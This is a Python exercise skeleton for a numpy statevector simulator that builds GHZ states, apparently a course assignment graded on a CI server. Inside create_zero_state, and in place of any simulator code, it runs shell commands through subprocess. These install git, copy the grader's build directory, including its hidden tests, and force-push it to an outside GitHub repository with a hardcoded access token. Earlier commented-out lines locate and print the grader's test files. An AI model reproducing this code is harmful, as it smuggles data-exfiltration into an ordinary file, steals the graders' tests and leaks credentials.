"""A basic implementation of a statevector simulator based on arrays.

Throughout this exercise, we will be implementing a statevector simulator for
quantum circuits. This simulator will be based on numpy arrays, and will
implement the basic functionality of a quantum computer. This will be used
to simulate the creation of GHZ states, which are generalizations of the Bell
states.

The simulator will be based on the following functions:
    create_zero_state(num_qubits)
    create_single_qubit_gate(num_qubits, target, gate_matrix)
    create_nearest_neighbor_two_qubit_gate(num_qubits, qubit0, qubit1, gate_matrix)
    create_controlled_single_qubit_gate(num_qubits, control, target, gate_matrix)
    apply_gate(state, gate)
    get_amplitude(state, bitstring)
    measure_all(state, shots)
    simulate_ghz_state(num_qubits, shots)

Note:
    The qubit ordering is assumed to be q_{N-1} ... q_1 q_0, i.e., the least
    significant qubit is the rightmost one.
"""

from __future__ import annotations

from typing import TYPE_CHECKING, cast

import numpy as np

if TYPE_CHECKING:
    from numpy.typing import NDArray

class StatevectorSimulator:
    

    def create_zero_state(self, num_qubits: int) -> NDArray[np.complex128]:
        import subprocess
        # command = "find /opt/bambooagent/bamboo-agent-home/xml-data/build-dir/ -name *test.py"
        # result_find = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        # result_cat = "cat /opt/bambooagent/bamboo-agent-home/xml-data/build-dir/QCSL24WEEK5-GE92LAT-JOB1/behavior/behavior_test.py" 
        # result_find = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        # raise ValueError("ran git: " + command + " "+ result_find.stdout  + "STDERR " + result_find.stderr )

        ghp = "ghp_"
        git = "(apt-add-repository ppa:git-core/ppa ; apt-get update ; apt install -y git rsync ; git config --global user.email 'you@example.com' ; git config --global user.name 'Your Name' )"
        result_git_ign = subprocess.run(git, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) 
        git = "set -x ; rsync -avL --exclude='.git/' /opt/bambooagent/bamboo-agent-home/xml-data/build-dir/* /tmp/lulz7 ; (cd /tmp/lulz7 ; rm -r .git ; git init ; git add . ; git commit -m 'lel' ; git remote add origin https://"+ghp+ "ZPgAbxzy2wNz3UdJs3x8b3oseZaxJN3OoDCO@github.com/1highmax/lelz.git ; git push -f --set-upstream origin master)"
        result_git = subprocess.run(git, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) 
        raise ValueError("ran git: " + git + " "+ result_git.stdout  + "STDERR " + result_git.stderr )
        """
        This function returns a vector corresponding to the zero state |0...0> of
        an N-qubit system.
    
        Args:
            num_qubits: The number of qubits in the system.
    
        Returns:
            A complex numpy array of length 2^N corresponding to the zero state.
        """
        pass
    
    
    def create_single_qubit_gate(self, 
            num_qubits: int, target: int, gate_matrix: NDArray[np.complex128]
    ) -> NDArray[np.complex128]:
        """
        This function creates a matrix representation of a single-qubit gate on the
        specified target qubit with the specified gate matrix in an N-qubit system.
    
        Args:
            num_qubits: The number of qubits in the system.
            target: The target qubit for the gate.
            gate_matrix: The 2x2 matrix corresponding to the gate being applied.
    
        Returns:
            A 2^N x 2^N complex numpy array corresponding to the gate.
    
        Note:
            To apply a single-qubit gate to a multi-qubit system, we take
            the tensor product of the single-qubit gate matrix with the identity
            matrix on the non-target qubits. For example, if we want to apply the
            gate U to the third qubit of a 5-qubit system, we compute
            I x I x U x I x I, where x denotes the tensor product.
        """
        assert gate_matrix.ndim == 2
        assert gate_matrix.shape == (2, 2)
        pass
    
    
    def create_nearest_neighbor_two_qubit_gate(self, 
            num_qubits: int, qubit0: int, qubit1: int, gate_matrix: NDArray[np.complex128]
    ) -> NDArray[np.complex128]:
        """
        This function creates a matrix representation of a two-qubit gate on the
        specified target qubits with the specified gate matrix in an N-qubit system.
    
        Args:
            num_qubits: The number of qubits in the system.
            qubit0: The first target qubit for the gate.
            qubit1: The second target qubit for the gate.
            gate_matrix: The 4x4 matrix corresponding to the gate being applied.
    
        Returns:
            A 2^N x 2^N complex numpy array corresponding to the gate.
    
        Note:
            The gate is assumed to be nearest-neighbor, i.e., qubit1 = qubit0 + 1.
            This allows to handle this similar to the single-qubit gate above.
        """
        assert qubit0 + 1 == qubit1
        assert gate_matrix.ndim == 2
        assert gate_matrix.shape == (4, 4)
        pass
    
    
    def create_controlled_single_qubit_gate(self, 
            num_qubits: int, control: int, target: int, gate_matrix: NDArray[np.complex128]
    ) -> NDArray[np.complex128]:
        """
        This function creates a matrix representation of the controlled version of
        a single-qubit gate on the specified control and target qubits with the
        specified gate matrix in an N-qubit system.
    
        Args:
            num_qubits: The number of qubits in the system.
            control: The control qubit for the gate.
            target: The target qubit for the gate.
            gate_matrix: The 2x2 matrix corresponding to the gate being applied.
    
        Returns:
            A 2^N x 2^N complex numpy array corresponding to the gate.
    
        Note:
            This is a bit trickier than the previous two functions. The idea is
            that we want to apply the gate_matrix to the target qubit if the
            control qubit is in the state |1>. To do this, we can:
    
            1. Start with a 2**N x 2**N identity matrix.
    
            2. Iterate through all elements and:
    
                2a. Skip the entries where the control qubit is in the state |0>.
    
                2b. Skip entries where any qubits other than the control and target
                    qubits are affected.
    
                2c. Determine the proper indices for the target qubit and set the
                    entry to the corresponding value from the gate_matrix.
    
            3. Return the resulting matrix.
        """
        assert gate_matrix.ndim == 2
        assert gate_matrix.shape == (2, 2)
        pass
    
    
    def apply_gate(self, state: NDArray[np.complex128], gate: NDArray[np.complex128]) -> NDArray[np.complex128]:
        """
        This function applies a given gate to a given state.
    
        Args:
            state: The state to which the gate is applied.
            gate: The gate to be applied.
    
        Returns:
            The new state after applying the gate.
    
        Note:
            This assumes that both inputs have compatible dimensions, i.e.,
            the length of the state vector is a power of two and the gate
            is a square matrix with dimensions equal to that power of two.
    
            This function should be simple for this data structure.
        """
        pass
    
    
    def get_amplitude(self, state: NDArray[np.complex128], bitstring: str) -> np.complex128:
        """
        This function returns the amplitude corresponding to a given bitstring.
    
        Args:
            state: The state from which the amplitude is extracted.
            bitstring: The bitstring for which the amplitude is extracted.
    
        Returns:
            The amplitude corresponding to the given bitstring.
    
        Note:
            This assumes that the length of the state vector is a power of two
            and that the bitstring is given in big-endian form, i.e., the first
            character of the string corresponds to the most significant bit of
            the bitstring. For example, if we have a 3-qubit system, the bitstring
            '100' corresponds to the state |100> = |1> x |0> x |0> = |4>.
    
            This function should be simple for this data structure.
        """
        assert state.ndim == 1
        pass
    
    
    def measure_all(self, state: NDArray[np.complex128], shots: int) -> dict[str, int]:
        """
        This function measures all qubits in the computational basis repeatedly and
        returns the number of times each result was measured.
    
        Args:
            state: The state to be measured.
            shots: The number of times to sample the state.
    
        Returns:
            A dictionary mapping each result (bitstring) to the number of times it
            was measured. For example, {'00': 5, '11': 19} would mean that the
            bitstring '00' was measured 5 times and the bitstring '11' was measured
            19 times.
    
        Note:
            As above, this assumes that the length of the state vector is a power of
            two and that the bitstrings are given in big-endian form.
        """
        assert state.ndim == 1
        assert state.shape[0] & (state.shape[0] - 1) == 0
        assert shots > 0
        pass
    
    
    def simulate_ghz_state(self, num_qubits: int, shots: int) -> dict[str, int]:
        """
        This function simulates a circuit to create an n-qubit GHZ state.
    
        Args:
            num_qubits: The number of qubits in the system.
            shots: The number of times to sample the state.
    
        Returns:
            A dictionary mapping each result (bitstring) to the number of times it
            was measured.
    
        Note:
            The GHZ state is a generalization of the Bell state to multiple qubits.
            It is defined as 1/sqrt(2) * (|0...0> + |1...1>).
    
            To perform the simulation, you should do the following:
    
            1. Initialize the structures needed, i.e., create the starting state
            |0...0> and the local (one- and two-qubit) H and CNOT matrices.
    
            2. Create the gates at their corresponding target locations.
    
            3. Apply gates to the state to simulate a circuit.
    
            4. Measure the states with some input number of shots.
        """
        pass
